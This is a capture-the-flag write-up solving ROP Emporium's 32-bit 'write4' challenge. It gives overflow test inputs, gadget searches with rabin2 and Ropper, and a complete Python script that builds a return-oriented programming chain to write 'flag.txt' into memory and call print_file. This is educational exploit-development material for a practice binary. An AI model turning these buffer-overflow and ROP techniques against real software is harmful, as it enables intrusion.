# write432
The challenge is available [here](https://ropemporium.com/challenge/write4.html).

## Black-Box Test
Like in all the challenges so far, we will also conduct a test now to discover the behavior of the software. Afterwards, we will find that the return address index is the same as in the previous challenges.

```
./write432
```
![](./0.png)
```
perl -e 'print "X"x44 . "\xef\xbe\xad\xde"' | ./write432
```
![](./1.png)
```
sudo dmesg -k | tail -2
```
![](./2.png)

## In-depth research
I assume that anyone reading this solution has already read the instructions for the challenge. We will find the address of the `print_file` function in the next command.

```
rabin2 -i write432
```
![](./3.png)

Additionally, we will also find the address of the regular helper function.

```
rabin2 -qs write432 | grep -ve 'imp' -e ' 0 ' -e '_'
```
![](./4.png)

Our goal is to make the call `print_file("flag.txt")`. Is the string "flag.txt" present in the binary? The instructions state that it is not. Let's verify this.

```
rabin2 -z write432
```
![](./5.png)

Indeed, there are no helpful strings. Let's take a look at the `usefulFunction`.

```
gdb write432
```
```
set disassembly-flavor intel
```
```
disas usefulFunction
```
![](./6.png)

To summarize, the `usefulFunction` calls `print_file` with one parameter on the stack. This parameter is the address of the string `"nonexistent"` from the previous image (you can also print it out to confirm). Therefore, `usefulFunction` executes `print_file("nonexistent")`.

To verify this in the best way possible, let's call `usefulFunction`. So let's exit the debugger (with the command `q`) and run the next command.

```
perl -e 'print "X"x44 . "\x2a\x85\x04\x08"' | ./write432
```
![](./7.png)

Okay, let's try again after creating a file named `nonexistent`.

```
echo ABCD > nonexistent
```
```
perl -e 'print "X"x44 . "\x2a\x85\x04\x08"' | ./write432
```
![](./8.png)

Indeed, the file was printed. Now, let's focus on the main issue of the current challenge, which is the absence of the string "flag.txt". To address this, we need to push parts of the string onto the stack and place it somewhere in memory.

This means we need to look for three things:
* a writable memory location
* a gadget that reads bytes from the stack to a register
* and a gadget that writes from a register to memory.

We'll start by searching for a writable memory location.

```
readelf -S write432
```
![](./9.png)

So, the `.data` section looks like a good candidate. It's writable, and its size is 8 bytes, which is just enough for our needs.

After some research and searching, I've also found two gadgets that are perfectly suited for our purpose.

```
python3 ~/ropper/Ropper.py
```
```
file write432
```
```
search pop
```
```
search /1/ mov [%], %
```
![](./10.png)

The combination of these two gadgets is simply perfect. The `edi` register will be used for the writable memory address, as derived from the `mov-gadget`. So, the `ebp` register will hold parts of the string "flag.txt". According to the `pop-gadget`, we learn that in the ROP chain, we will first write the address, followed by the relevant part of the string.

Now we have all the information we need.

## Solution
In the following table, the important addresses for constructing the ROP chain are summarized, along with a brief description of each.

| Name          | Type            | Address    | Description                                                       |
|---------------|-----------------|------------|-------------------------------------------------------------------|
| print_file    | Func            | 0x080483d0 | The entry address in the PLT table.                               |
| memory4string | Writable Memory | 0x0804a018 | .data segment addr will be where the string "flag.txt" is placed. |
| pop2registers | Gadget          | 0x080485aa | pop edi; pop ebp; ret;                                            |
| mov2memory    | Gadget          | 0x08048543 | mov dword ptr [edi], ebp; ret;                                    |

And the next table describes the ROP chain itself:

| No | Chain Link                             |
|----|----------------------------------------|
| 1  | 44 garbage bytes                       |
| 2  | pop2registers, memory4string, "flag"   |
| 3  | mov2memory                             |
| 4  | pop2registers, memory4string+4, ".txt" |
| 5  | mov2memory                             |
| 6  | print_file, "XXXX", memory4string      |

Where `"XXXX"` is the return address from the `print_file` function, which is not needed at all (it's there just to ensure that the parameter `memory4string` is in the right place on the stack).

All that remains is to build the Python script that creates the ROP chain, and we’re done!

```python
# chain_builder.py
import struct

def little_endian(number):
    """
    : The function accepts a number not
    : exceeding 4 bytes in size and returns it
    : as a string of hexadecimal characters in : little-endian format.
    """
    return struct.pack("<I", number)

# Parts of the chain
fill_buffer  = b"X"*44

print_file          = little_endian(0x080483d0)

memory4string_part1 = little_endian(0x0804a018)
memory4string_part2 = little_endian(0x0804a018+4) # That's fine because the addition does not create a null byte.

pop2registers       = little_endian(0x080485aa)
mov2memory          = little_endian(0x08048543)

# Building the chain
ROP_Chain = fill_buffer
ROP_Chain += pop2registers + memory4string_part1 + b"flag"
ROP_Chain += mov2memory
ROP_Chain += pop2registers + memory4string_part2 + b".txt"
ROP_Chain += mov2memory
ROP_Chain += print_file + b"XXXX" + memory4string_part1

# Saving the chain in a binary file
with open("rop_chain", "wb") as f:
    f.write(ROP_Chain)
```
```
python3 chain_builder.py
```
```
cat rop_chain | ./write432
```
![](./11.png)

Heida!!
